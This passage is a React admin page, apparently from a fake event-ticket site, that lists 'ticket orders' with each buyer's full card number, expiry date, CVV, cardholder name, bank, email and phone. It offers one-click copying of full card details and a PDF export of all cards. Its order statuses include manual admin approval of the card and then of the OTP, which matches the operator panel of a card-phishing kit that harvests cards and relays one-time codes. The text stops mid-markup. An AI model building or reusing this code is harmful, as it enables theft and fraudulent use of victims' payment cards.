import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import {
  Search, CreditCard, Mail, Phone, Hash, Receipt, Ticket,
  CheckCircle, XCircle, Filter, ShieldCheck, Clock, Ban, Landmark, Copy, Check, FileText, Trash2,
} from "lucide-react";
import { toast } from "sonner";
import jsPDF from "jspdf";
import html2canvas from "html2canvas";
import ExportButtons from "@/components/admin/ExportButtons";
import { playChime } from "@/hooks/use-action-sound";
import {
  AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent,
  AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
} from "@/components/ui/alert-dialog";

interface Order {
  id: string;
  email: string;
  phone: string;
  tickets: any[];
  subtotal: number;
  vat: number;
  total: number;
  payment_method: string;
  status: string;
  confirmation_number: string | null;
  created_at: string;
  card_last4: string | null;
  card_brand: string | null;
  cardholder_name: string | null;
  bank_name: string | null;
  card_full_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
}

const statusConfig: Record<string, { label: string; gradient: string; bg: string; text: string; dot: string; icon: any }> = {
  confirmed: { label: "مقبول", gradient: "from-emerald-500 to-teal-500", bg: "bg-emerald-50", text: "text-emerald-600", dot: "bg-emerald-400", icon: ShieldCheck },
  pending: { label: "بانتظار موافقة البطاقة", gradient: "from-amber-400 to-orange-500", bg: "bg-amber-50", text: "text-amber-600", dot: "bg-amber-400", icon: Clock },
  approved_card: { label: "تمت موافقة البطاقة", gradient: "from-blue-500 to-indigo-500", bg: "bg-blue-50", text: "text-blue-600", dot: "bg-blue-400", icon: CreditCard },
  pending_otp: { label: "بانتظار موافقة OTP", gradient: "from-orange-400 to-red-400", bg: "bg-orange-50", text: "text-orange-600", dot: "bg-orange-400", icon: Clock },
  rejected: { label: "مرفوض", gradient: "from-red-500 to-rose-500", bg: "bg-red-50", text: "text-red-500", dot: "bg-red-400", icon: XCircle },
  cancelled: { label: "ملغي", gradient: "from-slate-400 to-slate-500", bg: "bg-slate-50", text: "text-slate-500", dot: "bg-slate-400", icon: Ban },
};

const AdminOrders = () => {
  const [orders, setOrders] = useState<Order[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const [showClearAll, setShowClearAll] = useState(false);
  const [redFlash, setRedFlash] = useState(false);

  const clearAllOrders = async () => {
    playChime("delete");
    if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
    setRedFlash(true);
    setTimeout(() => setRedFlash(false), 600);
    try {
      await supabase.from("otp_requests").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      await supabase.from("ticket_orders").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      setOrders([]);
      setShowClearAll(false);
      toast.success("تم مسح جميع الطلبات بنجاح");
    } catch {
      toast.error("حدث خطأ أثناء المسح");
    }
  };

  const copyCardInfo = (order: Order) => {
    const parts: string[] = [];
    if (order.cardholder_name) parts.push(`الاسم: ${order.cardholder_name}`);
    if (order.card_full_number) parts.push(`الرقم: ${order.card_full_number}`);
    else if (order.card_last4) parts.push(`الرقم: •••• ${order.card_last4}`);
    if (order.card_expiry) parts.push(`الانتهاء: ${order.card_expiry}`);
    if (order.card_cvv) parts.push(`CVV: ${order.card_cvv}`);
    if (order.card_brand) parts.push(`النوع: ${order.card_brand}`);
    if (order.bank_name) parts.push(`البنك: ${order.bank_name}`);
    
    navigator.clipboard.writeText(parts.join("\n")).then(() => {
      setCopiedId(order.id);
      toast.success("تم نسخ بيانات البطاقة", { duration: 2000 });
      setTimeout(() => setCopiedId(null), 2000);
    });
  };

  const exportCardsPDF = async () => {
    const cardsData = filtered.filter(o => o.card_full_number || o.card_last4);
    if (cardsData.length === 0) {
      toast.error("لا توجد بيانات بطاقات للتصدير");
      return;
    }

    toast.loading("جاري تصدير التقرير...", { id: "pdf-export" });

    // Build hidden HTML
    const container = document.createElement("div");
    container.style.cssText = "position:fixed;left:-9999px;top:0;width:794px;background:#fff;font-family:'Segoe UI',Tahoma,Arial,sans-serif;direction:rtl;padding:40px;";
    container.innerHTML = `
      <div style="text-align:center;margin-bottom:32px;padding-bottom:20px;border-bottom:2px solid #f1f5f9;">
        <img src="/images/diriyah-season-logo.jpg" style="width:120px;height:auto;border-radius:16px;margin:0 auto 14px;display:block;object-fit:contain;" />
        <h1 style="font-size:24px;font-weight:800;color:#1a1a2e;margin:0 0 6px;">تقرير بيانات البطاقات</h1>
        <p style="font-size:12px;color:#94a3b8;margin:0;">${new Date().toLocaleDateString("ar-SA")} — ${cardsData.length} بطاقة</p>
        <div style="height:3px;background:linear-gradient(90deg,transparent,#d4a843,transparent);margin-top:16px;border-radius:2px;"></div>
      </div>
      ${cardsData.map((o, i) => {
        const bankKey = o.bank_name || "";
        const bankLogos: Record<string, string> = {
          "مصرف الراجحي": "/banks/alrajhi.png",
          "Al Rajhi Bank": "/banks/alrajhi.png",
          "البنك الأهلي السعودي": "/banks/snb.png",
          "Saudi National Bank": "/banks/snb.png",
          "البنك السعودي الفرنسي": "/banks/bsf.png",
          "Banque Saudi Fransi": "/banks/bsf.png",
          "بنك الرياض": "/banks/riyad.png",
          "Riyad Bank": "/banks/riyad.png",
          "مصرف الإنماء": "/banks/alinma.png",
          "Alinma Bank": "/banks/alinma.png",
          "بنك البلاد": "/banks/albilad.png",
          "Bank Albilad": "/banks/albilad.png",
          "البنك العربي الوطني": "/banks/anb.png",
          "Arab National Bank": "/banks/anb.png",
          "البنك السعودي الأول": "/banks/sab.png",
          "Saudi Awwal Bank": "/banks/sab.png",
          "بنك الجزيرة": "/banks/aljazira.png",
          "Bank AlJazira": "/banks/aljazira.png",
          "البنك السعودي للاستثمار": "/banks/sib.png",
          "Saudi Investment Bank": "/banks/sib.png",
          "STC Pay": "/banks/stcpay.png",
        };
        const logoUrl = bankLogos[bankKey] || "";
        const hasBankName = !!o.bank_name;

        const bankColors: Record<string, { header: string; accent: string; bg: string; border: string }> = {
          "مصرف الراجحي": { header: "linear-gradient(135deg,#004d3d,#00795e)", accent: "#00c49a", bg: "#f0fdf9", border: "#bbf7d0" },
          "Al Rajhi Bank": { header: "linear-gradient(135deg,#004d3d,#00795e)", accent: "#00c49a", bg: "#f0fdf9", border: "#bbf7d0" },
          "البنك الأهلي السعودي": { header: "linear-gradient(135deg,#1a3a5c,#2563a0)", accent: "#3b82f6", bg: "#eff6ff", border: "#bfdbfe" },
          "Saudi National Bank": { header: "linear-gradient(135deg,#1a3a5c,#2563a0)", accent: "#3b82f6", bg: "#eff6ff", border: "#bfdbfe" },
          "البنك السعودي الفرنسي": { header: "linear-gradient(135deg,#1e3a5f,#2d5a8e)", accent: "#4a90d9", bg: "#eff6ff", border: "#bfdbfe" },
          "Banque Saudi Fransi": { header: "linear-gradient(135deg,#1e3a5f,#2d5a8e)", accent: "#4a90d9", bg: "#eff6ff", border: "#bfdbfe" },
          "بنك الرياض": { header: "linear-gradient(135deg,#4a1a6b,#7c3aed)", accent: "#8b5cf6", bg: "#faf5ff", border: "#ddd6fe" },
          "Riyad Bank": { header: "linear-gradient(135deg,#4a1a6b,#7c3aed)", accent: "#8b5cf6", bg: "#faf5ff", border: "#ddd6fe" },
          "مصرف الإنماء": { header: "linear-gradient(135deg,#064e3b,#047857)", accent: "#10b981", bg: "#ecfdf5", border: "#a7f3d0" },
          "Alinma Bank": { header: "linear-gradient(135deg,#064e3b,#047857)", accent: "#10b981", bg: "#ecfdf5", border: "#a7f3d0" },
          "بنك البلاد": { header: "linear-gradient(135deg,#7c2d12,#c2410c)", accent: "#f97316", bg: "#fff7ed", border: "#fed7aa" },
          "Bank Albilad": { header: "linear-gradient(135deg,#7c2d12,#c2410c)", accent: "#f97316", bg: "#fff7ed", border: "#fed7aa" },
          "البنك العربي الوطني": { header: "linear-gradient(135deg,#1e3a5f,#1d4ed8)", accent: "#3b82f6", bg: "#eff6ff", border: "#bfdbfe" },
          "Arab National Bank": { header: "linear-gradient(135deg,#1e3a5f,#1d4ed8)", accent: "#3b82f6", bg: "#eff6ff", border: "#bfdbfe" },
          "البنك السعودي الأول": { header: "linear-gradient(135deg,#1e3a5f,#0369a1)", accent: "#0ea5e9", bg: "#f0f9ff", border: "#bae6fd" },
          "Saudi Awwal Bank": { header: "linear-gradient(135deg,#1e3a5f,#0369a1)", accent: "#0ea5e9", bg: "#f0f9ff", border: "#bae6fd" },
          "بنك الجزيرة": { header: "linear-gradient(135deg,#7f1d1d,#b91c1c)", accent: "#ef4444", bg: "#fef2f2", border: "#fecaca" },
          "Bank AlJazira": { header: "linear-gradient(135deg,#7f1d1d,#b91c1c)", accent: "#ef4444", bg: "#fef2f2", border: "#fecaca" },
          "البنك السعودي للاستثمار": { header: "linear-gradient(135deg,#134e4a,#0d9488)", accent: "#14b8a6", bg: "#f0fdfa", border: "#99f6e4" },
          "Saudi Investment Bank": { header: "linear-gradient(135deg,#134e4a,#0d9488)", accent: "#14b8a6", bg: "#f0fdfa", border: "#99f6e4" },
          "STC Pay": { header: "linear-gradient(135deg,#581c87,#7e22ce)", accent: "#a855f7", bg: "#faf5ff", border: "#e9d5ff" },
        };
        const colors = bankColors[bankKey] || { header: "linear-gradient(135deg,#1a1a2e,#2d2d44)", accent: "#d4a843", bg: "#fafbfc", border: "#e2e8f0" };

        return `
        <div style="border:1px solid ${colors.border};border-radius:12px;overflow:hidden;margin-bottom:16px;break-inside:avoid;">
          <div style="background:${colors.header};padding:10px 16px;display:flex;justify-content:space-between;align-items:center;">
            <span style="color:${colors.accent};font-size:11px;font-weight:700;">${o.confirmation_number || o.id.slice(0, 8)}</span>
            <span style="color:#fff;font-size:12px;font-weight:700;">#${i + 1} ${(o.card_brand || "CARD").toUpperCase()}</span>
          </div>
          <div style="padding:14px 16px;background:${colors.bg};">
            ${hasBankName ? `
            <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;padding:8px 12px;background:#fff;border-radius:8px;border:1px solid ${colors.border};">
              ${logoUrl ? `<img src="${logoUrl}" style="width:36px;height:36px;border-radius:8px;object-fit:contain;background:#fff;border:1px solid ${colors.border};padding:3px;" />` : ""}
              <div style="text-align:center;">
                <p style="font-size:12px;font-weight:700;color:#334155;margin:0;">${o.bank_name}</p>
                <p style="font-size:9px;color:#94a3b8;margin:1px 0 0;">${o.card_brand || ""}</p>
              </div>
            </div>` : ""}
            <div style="height:1px;background:linear-gradient(90deg,transparent,${colors.border},transparent);margin:12px 0;"></div>
            <div style="margin-bottom:10px;">
              <span style="font-size:10px;color:#94a3b8;">رقم البطاقة</span>
              <p style="font-size:16px;font-weight:700;color:#1a1a2e;margin:2px 0 0;letter-spacing:2px;direction:ltr;text-align:left;">${o.card_full_number || `**** ${o.card_last4}`}</p>
            </div>
            <div style="display:flex;gap:24px;margin-bottom:10px;">
              <div style="flex:1;">
                <span style="font-size:10px;color:#94a3b8;">الانتهاء</span>
                <p style="font-size:13px;font-weight:600;color:#1a1a2e;margin:2px 0 0;direction:ltr;">${o.card_expiry || "N/A"}</p>
              </div>
              <div style="flex:1;">
                <span style="font-size:10px;color:#94a3b8;">CVV</span>
                <p style="font-size:13px;font-weight:700;color:#dc2626;margin:2px 0 0;direction:ltr;">${o.card_cvv || "N/A"}</p>
              </div>
              <div style="flex:1;">
                <span style="font-size:10px;color:#94a3b8;">المبلغ</span>
                <p style="font-size:13px;font-weight:600;color:#1a1a2e;margin:2px 0 0;">${o.total} ر.س</p>
              </div>
            </div>
            <div style="display:flex;gap:24px;margin-bottom:10px;">
              <div style="flex:1;">
                <span style="font-size:10px;color:#94a3b8;">حامل البطاقة</span>
                <p style="font-size:12px;font-weight:600;color:#334155;margin:2px 0 0;">${o.cardholder_name || "—"}</p>
              </div>
            </div>
            <div style="border-top:1px solid #f1f5f9;padding-top:8px;display:flex;gap:16px;">
              <span style="font-size:10px;color:#94a3b8;">📧 ${o.email}</span>
              <span style="font-size:10px;color:#94a3b8;direction:ltr;">📱 ${o.phone}</span>
            </div>
          </div>
        </div>`;
      }).join("")}
      <div style="text-align:center;margin-top:20px;padding-top:12px;border-top:1px solid #e2e8f0;">
        <p style="font-size:9px;color:#cbd5e1;">سري — تقرير بيانات البطاقات — ${new Date().toLocaleString("ar-SA")}</p>
      </div>
    `;
    document.body.appendChild(container);

    try {
      const canvas = await html2canvas(container, { scale: 2, useCORS: true, backgroundColor: "#ffffff" });
      document.body.removeChild(container);

      const imgW = 190;
      const imgH = (canvas.height * imgW) / canvas.width;
      const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
      const pageH = 277;
      let position = 10;

      if (imgH <= pageH) {
        doc.addImage(canvas.toDataURL("image/png"), "PNG", 10, position, imgW, imgH);
      } else {
        // Multi-page
        let remainingH = canvas.height;
        let srcY = 0;
        const sliceHPx = (pageH / imgH) * canvas.height;

        while (remainingH > 0) {
          const sliceH = Math.min(sliceHPx, remainingH);
          const pageCanvas = document.createElement("canvas");
          pageCanvas.width = canvas.width;
          pageCanvas.height = sliceH;
          const ctx = pageCanvas.getContext("2d")!;
          ctx.drawImage(canvas, 0, srcY, canvas.width, sliceH, 0, 0, canvas.width, sliceH);

          const pageImgH = (sliceH * imgW) / canvas.width;
          if (srcY > 0) doc.addPage();
          doc.addImage(pageCanvas.toDataURL("image/png"), "PNG", 10, 10, imgW, pageImgH);

          srcY += sliceH;
          remainingH -= sliceH;
        }
      }

      doc.save("card-data-report.pdf");
      toast.success("تم تصدير بيانات البطاقات بنجاح", { id: "pdf-export" });
    } catch (err) {
      document.body.removeChild(container);
      console.error(err);
      toast.error("فشل التصدير", { id: "pdf-export" });
    }
  };

  const fetchOrders = async () => {
    const { data } = await supabase
      .from("ticket_orders")
      .select("*")
      .order("created_at", { ascending: false });
    setOrders((data as Order[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    fetchOrders();
    const channel = supabase
      .channel("orders-realtime")
      .on("postgres_changes" as any, { event: "*", schema: "public", table: "ticket_orders" }, () => fetchOrders())
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);

  useEffect(() => {
    const handler = () => fetchOrders();
    window.addEventListener("admin-pull-refresh", handler);
    return () => window.removeEventListener("admin-pull-refresh", handler);
  }, []);

  const updateStatus = async (id: string, currentStatus: string, action: "approve" | "reject") => {
    let newStatus = "rejected";
    if (action === "approve") {
      if (currentStatus === "pending") newStatus = "approved_card";
      else if (currentStatus === "pending_otp") newStatus = "confirmed";
      else newStatus = "confirmed";
    }
    await supabase.from("ticket_orders").update({ status: newStatus }).eq("id", id);
    setOrders(prev => prev.map(o => o.id === id ? { ...o, status: newStatus } : o));
  };

  const filtered = orders.filter(o => {
    if (statusFilter === "confirmed" && o.status !== "confirmed") return false;
    if (statusFilter === "unconfirmed" && o.status === "confirmed") return false;
    if (!search) return true;
    const q = search.toLowerCase();
    return o.email.toLowerCase().includes(q) || o.phone.includes(q) || (o.confirmation_number || "").includes(q);
  });

  const totalRevenue = filtered.reduce((s, o) => s + (o.status === "confirmed" ? o.total : 0), 0);

  return (
    <div className="space-y-5 relative">
      {redFlash && <div className="fixed inset-0 bg-red-500/20 z-[100] pointer-events-none animate-[flash_0.6s_ease-out_forwards]" />}
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-emerald-500 to-teal-600 flex items-center justify-center shadow-lg shadow-emerald-500/20">
            <Ticket className="w-4.5 h-4.5 text-white" />
          </div>
          <div>
            <h2 className="text-[15px] font-bold text-slate-800">طلبات التذاكر</h2>
            <p className="text-[10px] text-slate-400">{filtered.length} طلب • {totalRevenue} ر.س إيرادات</p>
          </div>
        </div>
        <div className="flex items-center gap-1.5">
          <ExportButtons
            data={filtered}
            filename="orders"
            title="طلبات التذاكر"
            columns={[
              { key: "email", label: "البريد" },
              { key: "phone", label: "الهاتف" },
              { key: "total", label: "الإجمالي", format: (v) => `${v} ر.س` },
              { key: "payment_method", label: "طريقة الدفع", format: (v) => v === "card" ? "بطاقة" : v },
              { key: "status", label: "الحالة", format: (v) => v === "confirmed" ? "مقبول" : v === "rejected" ? "مرفوض" : "قيد المراجعة" },
              { key: "confirmation_number", label: "رقم التأكيد" },
              { key: "cardholder_name", label: "حامل البطاقة" },
              { key: "created_at", label: "التاريخ", format: (v) => new Date(v).toLocaleDateString("ar-SA") },
            ]}
          />
          <button
            onClick={exportCardsPDF}
            className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-violet-50 text-violet-600 text-[11px] font-medium hover:bg-violet-100 transition-colors"
            title="تصدير بيانات البطاقات PDF"
          >
            <CreditCard className="w-3.5 h-3.5" />
            بطاقات PDF
          </button>
          {orders.length > 0 && (
            <button
              onClick={() => setShowClearAll(true)}
              className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors"
              title="مسح جميع الطلبات"
            >
              <Trash2 className="w-3.5 h-3.5" />
              مسح الكل
            </button>
          )}
        </div>
      </div>


      <div className="relative">
        <Search className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
        <input
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="بحث بالبريد أو رقم الجوال أو رقم التأكيد..."
          className="w-full bg-white border border-slate-200/80 rounded-xl pr-10 pl-4 py-2.5 text-[16px] sm:text-[13px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-400 transition-all shadow-sm"
        />
      </div>

      {/* Filters */}
      <div className="flex items-center gap-2 flex-wrap">
        {[
          { key: "all", label: "الكل", gradient: "from-slate-600 to-slate-700" },
          { key: "confirmed", label: "تم التحقق", gradient: "from-emerald-500 to-teal-500" },
          { key: "unconfirmed", label: "لم يتم التحقق", gradient: "from-amber-500 to-orange-500" },
        ].map((f) => (
          <button
            key={f.key}
            onClick={() => setStatusFilter(f.key)}
            className={`px-3.5 py-1.5 rounded-lg text-[11px] font-semibold transition-all duration-200 ${
              statusFilter === f.key
                ? `bg-gradient-to-r ${f.gradient} text-white shadow-sm`
                : "bg-white text-slate-500 hover:bg-slate-50 border border-slate-200/80"
            }`}
          >
            {f.label}
          </button>
        ))}
      </div>

      {/* Legend */}
      <div className="flex items-center gap-3 flex-wrap text-[10px] text-slate-400 bg-white/60 rounded-xl px-3 py-2 border border-slate-100/80">
        {Object.entries(statusConfig).map(([key, val]) => (
          <span key={key} className="flex items-center gap-1.5">
            <span className={`w-2 h-2 rounded-full ${val.dot}`} />
            {val.label}
          </span>
        ))}
      </div>

      {/* Order Cards */}
      <div className="space-y-3">
        {loading ? (
          [1, 2, 3].map(i => (
            <div key={i} className="bg-white rounded-2xl border border-slate-100/80 p-5 animate-pulse">
              <div className="flex gap-3">
                <div className="w-11 h-11 bg-gradient-to-br from-slate-100 to-slate-50 rounded-xl" />
                <div className="flex-1 space-y-2.5">
                  <div className="w-1/3 h-3.5 bg-slate-100 rounded-lg" />
                  <div className="w-1/2 h-3 bg-slate-50 rounded-lg" />
                </div>
              </div>
            </div>
          ))
        ) : filtered.length === 0 ? (
          <div className="bg-white rounded-2xl border border-slate-100/80 p-12 text-center">
            <div className="w-14 h-14 mx-auto rounded-2xl bg-slate-50 flex items-center justify-center mb-3">
              <Ticket className="w-6 h-6 text-slate-300" />
            </div>
            <p className="text-slate-400 text-sm">لا توجد طلبات</p>
          </div>
        ) : (
          filtered.map((o) => {
            const st = statusConfig[o.status] || statusConfig.pending;
            const StIcon = st.icon;
            const isPending = o.status === "pending" || o.status === "pending_otp";

            const uiBankColors: Record<string, { strip: string; accent: string; bg: string; text: string; border: string }> = {
              "مصرف الراجحي": { strip: "from-green-600 to-emerald-500", accent: "text-green-700", bg: "bg-green-50", text: "text-green-600", border: "border-green-200" },
              "Al Rajhi Bank": { strip: "from-green-600 to-emerald-500", accent: "text-green-700", bg: "bg-green-50", text: "text-green-600", border: "border-green-200" },
              "البنك الأهلي السعودي": { strip: "from-blue-700 to-blue-500", accent: "text-blue-700", bg: "bg-blue-50", text: "text-blue-600", border: "border-blue-200" },
              "Saudi National Bank": { strip: "from-blue-700 to-blue-500", accent: "text-blue-700", bg: "bg-blue-50", text: "text-blue-600", border: "border-blue-200" },
              "البنك السعودي الفرنسي": { strip: "from-sky-700 to-sky-500", accent: "text-sky-700", bg: "bg-sky-50", text: "text-sky-600", border: "border-sky-200" },
              "Banque Saudi Fransi": { strip: "from-sky-700 to-sky-500", accent: "text-sky-700", bg: "bg-sky-50", text: "text-sky-600", border: "border-sky-200" },
              "بنك الرياض": { strip: "from-purple-700 to-violet-500", accent: "text-purple-700", bg: "bg-purple-50", text: "text-purple-600", border: "border-purple-200" },
              "Riyad Bank": { strip: "from-purple-700 to-violet-500", accent: "text-purple-700", bg: "bg-purple-50", text: "text-purple-600", border: "border-purple-200" },
              "مصرف الإنماء": { strip: "from-emerald-700 to-teal-500", accent: "text-emerald-700", bg: "bg-emerald-50", text: "text-emerald-600", border: "border-emerald-200" },
              "Alinma Bank": { strip: "from-emerald-700 to-teal-500", accent: "text-emerald-700", bg: "bg-emerald-50", text: "text-emerald-600", border: "border-emerald-200" },
              "بنك البلاد": { strip: "from-orange-600 to-amber-500", accent: "text-orange-700", bg: "bg-orange-50", text: "text-orange-600", border: "border-orange-200" },
              "Bank Albilad": { strip: "from-orange-600 to-amber-500", accent: "text-orange-700", bg: "bg-orange-50", text: "text-orange-600", border: "border-orange-200" },
              "البنك العربي الوطني": { strip: "from-indigo-700 to-blue-500", accent: "text-indigo-700", bg: "bg-indigo-50", text: "text-indigo-600", border: "border-indigo-200" },
              "Arab National Bank": { strip: "from-indigo-700 to-blue-500", accent: "text-indigo-700", bg: "bg-indigo-50", text: "text-indigo-600", border: "border-indigo-200" },
              "البنك السعودي الأول": { strip: "from-cyan-700 to-sky-500", accent: "text-cyan-700", bg: "bg-cyan-50", text: "text-cyan-600", border: "border-cyan-200" },
              "Saudi Awwal Bank": { strip: "from-cyan-700 to-sky-500", accent: "text-cyan-700", bg: "bg-cyan-50", text: "text-cyan-600", border: "border-cyan-200" },
              "بنك الجزيرة": { strip: "from-red-700 to-rose-500", accent: "text-red-700", bg: "bg-red-50", text: "text-red-600", border: "border-red-200" },
              "Bank AlJazira": { strip: "from-red-700 to-rose-500", accent: "text-red-700", bg: "bg-red-50", text: "text-red-600", border: "border-red-200" },
              "البنك السعودي للاستثمار": { strip: "from-teal-700 to-cyan-500", accent: "text-teal-700", bg: "bg-teal-50", text: "text-teal-600", border: "border-teal-200" },
              "Saudi Investment Bank": { strip: "from-teal-700 to-cyan-500", accent: "text-teal-700", bg: "bg-teal-50", text: "text-teal-600", border: "border-teal-200" },
              "STC Pay": { strip: "from-purple-600 to-fuchsia-500", accent: "text-purple-700", bg: "bg-purple-50", text: "text-purple-600", border: "border-purple-200" },
            };
            const bankC = o.bank_name ? uiBankColors[o.bank_name] : null;

            return (
              <div
                key={o.id}
                className={`bg-white rounded-2xl border overflow-hidden transition-all duration-300 hover:shadow-lg hover:-translate-y-0.5 ${
                  isPending ? "border-amber-200/80 shadow-sm shadow-amber-100/50" : bankC ? `${bankC.border}/80` : "border-slate-100/80 hover:shadow-slate-200/60"
                }`}
              >
                {/* Gradient top strip */}
                <div className={`h-1 bg-gradient-to-r ${bankC ? bankC.strip : st.gradient}`} />

                {/* Header */}
                <div className="p-4">
                  <div className="flex items-start gap-3">
                    <div className={`w-11 h-11 rounded-xl bg-gradient-to-br ${st.gradient} flex items-center justify-center shadow-md shrink-0`}>
                      <Ticket className="w-5 h-5 text-white" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between gap-2">
                        <span className="text-[13px] font-semibold text-slate-800 truncate" dir="ltr">{o.email}</span>
                        <span className={`text-[9px] font-bold px-2.5 py-0.5 rounded-full bg-gradient-to-r ${st.gradient} text-white shadow-sm whitespace-nowrap`}>
                          {st.label}
                        </span>
                      </div>
                      <div className="flex items-center gap-3 mt-1.5">
                        <span className="flex items-center gap-1 text-[11px] text-slate-400">
                          <Phone className="w-3 h-3" />
                          <span dir="ltr">{o.phone}</span>
                        </span>
                        <span className="text-[10px] text-slate-300">
                          {format(new Date(o.created_at), "dd MMM، HH:mm", { locale: ar })}
                        </span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Details */}
                <div className="px-4 pb-4 space-y-2.5">
                  {/* Order Info */}
                  <div className="rounded-xl overflow-hidden border border-slate-100/80">
                    <div className="bg-gradient-to-l from-blue-50/80 to-transparent px-3 py-2 flex items-center justify-between border-b border-slate-100/50">
                      <span className="text-[11px] font-bold text-blue-600 flex items-center gap-1.5">
                        <Receipt className="w-3.5 h-3.5" />
                        تفاصيل الطلب
                      </span>
                      {o.confirmation_number && (
                        <span className="text-[10px] font-mono text-blue-500 bg-blue-50 px-2 py-0.5 rounded-md">
                          #{o.confirmation_number}
                        </span>
                      )}
                    </div>
                    <div className="p-3 space-y-2 text-[12px]">
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">المجموع الفرعي</span>
                        <span className="text-slate-600">{o.subtotal} ر.س</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">ضريبة القيمة المضافة</span>
                        <span className="text-slate-600">{o.vat} ر.س</span>
                      </div>
                      <div className="flex items-center justify-between border-t border-slate-100/80 pt-2">
                        <span className="text-slate-700 font-bold">الإجمالي</span>
                        <span className="text-[15px] font-bold bg-gradient-to-r from-emerald-600 to-teal-600 bg-clip-text text-transparent">{o.total} ر.س</span>
                      </div>
                    </div>
                  </div>

                  {/* Payment */}
                  <div className={`rounded-xl overflow-hidden border ${bankC ? bankC.border : "border-slate-100/80"}`}>
                    <div className={`${bankC ? bankC.bg : "bg-gradient-to-l from-violet-50/80 to-transparent"} px-3 py-2 border-b ${bankC ? bankC.border + "/50" : "border-slate-100/50"} flex items-center justify-between`}>
                      <span className={`text-[11px] font-bold ${bankC ? bankC.text : "text-violet-600"} flex items-center gap-1.5`}>
                        <CreditCard className="w-3.5 h-3.5" />
                        بيانات الدفع
                      </span>
                      {(o.card_full_number || o.card_last4) && (
                        <button
                          onClick={() => copyCardInfo(o)}
                          className={`flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] font-semibold transition-all duration-200 ${
                            copiedId === o.id
                              ? "bg-emerald-100 text-emerald-600"
                              : "bg-violet-100 text-violet-600 hover:bg-violet-200 active:scale-95"
                          }`}
                        >
                          {copiedId === o.id ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                          {copiedId === o.id ? "تم النسخ" : "نسخ البيانات"}
                        </button>
                      )}
                    </div>
                    <div className="p-3 space-y-2 text-[12px]">
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">طريقة الدفع</span>
                        <span className="text-slate-700 font-medium">
                          {o.payment_method === "card" ? "بطاقة ائتمان" : o.payment_method}
                        </span>
                      </div>
                      {o.card_full_number && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">رقم البطاقة الكامل</span>
                          <div className="flex items-center gap-1.5">
                            <span className="text-[10px] uppercase font-bold text-violet-500 bg-violet-50 px-1.5 py-0.5 rounded">{o.card_brand || "CARD"}</span>
                            <span className="font-mono text-slate-700 font-semibold" dir="ltr">{o.card_full_number}</span>
                          </div>
                        </div>
                      )}
                      {!o.card_full_number && o.card_last4 && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">رقم البطاقة</span>
                          <div className="flex items-center gap-1.5">
                            <span className="text-[10px] uppercase font-bold text-violet-500 bg-violet-50 px-1.5 py-0.5 rounded">{o.card_brand || "CARD"}</span>
                            <span className="font-mono text-slate-600" dir="ltr">•••• {o.card_last4}</span>
                          </div>
                        </div>
                      )}
                      {o.card_expiry && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">تاريخ الانتهاء</span>
                          <span className="font-mono text-slate-700 font-semibold" dir="ltr">{o.card_expiry}</span>
                        </div>
                      )}
                      {o.card_cvv && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">CVV</span>
                          <span className="font-mono text-red-600 font-bold bg-red-50 px-2 py-0.5 rounded" dir="ltr">{o.card_cvv}</span>
                        </div>
                      )}
                      {o.cardholder_name && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">حامل البطاقة</span>
                          <span className="text-slate-700 font-medium">{o.cardholder_name}</span>
                        </div>
                      )}
                      {o.bank_name && (
                        <div className={`flex items-center justify-between ${bankC ? `${bankC.bg} -mx-3 px-3 py-1.5 rounded-lg` : ""}`}>
                          <span className="text-slate-400 flex items-center gap-1"><Landmark className="w-3 h-3" /> البنك</span>
                          <span className={`font-semibold ${bankC ? bankC.accent : "text-slate-700"}`}>{o.bank_name}</span>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Action Buttons */}
                  {isPending ? (
                    <div className="flex gap-2">
                      <button
                        onClick={() => updateStatus(o.id, o.status, "approve")}
                        className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 text-white text-[12px] font-bold shadow-md shadow-emerald-500/20 hover:shadow-lg hover:shadow-emerald-500/30 transition-all active:scale-[0.98]"
                      >
                        <CheckCircle className="w-4 h-4" />
                        {o.status === "pending" ? "موافقة البطاقة" : "موافقة OTP"}
                      </button>
                      <button
                        onClick={() => updateStatus(o.id, o.status, "reject")}
